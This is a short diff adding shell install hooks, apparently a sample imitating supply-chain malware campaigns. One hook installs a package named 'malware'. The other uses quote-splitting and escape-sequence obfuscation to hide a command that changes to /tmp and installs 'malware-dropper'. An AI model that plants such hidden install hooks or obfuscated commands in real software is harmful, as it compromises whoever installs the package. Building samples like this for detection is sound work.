@@ -1,0 +1,10 @@
+# first campaign
+pre_install() {
+	bun add malware;
+}
+
+# second campaign (obfuscated)
+post_install() {
+	$'\x63'"d" "/"'t'"m"'p' && "b"'u'"n" "a"'d'"d" $"m"'\141'"l"'w'"a"'r'"e"'-'"d"'r'"o""p""p"'e'"r";
+}
+
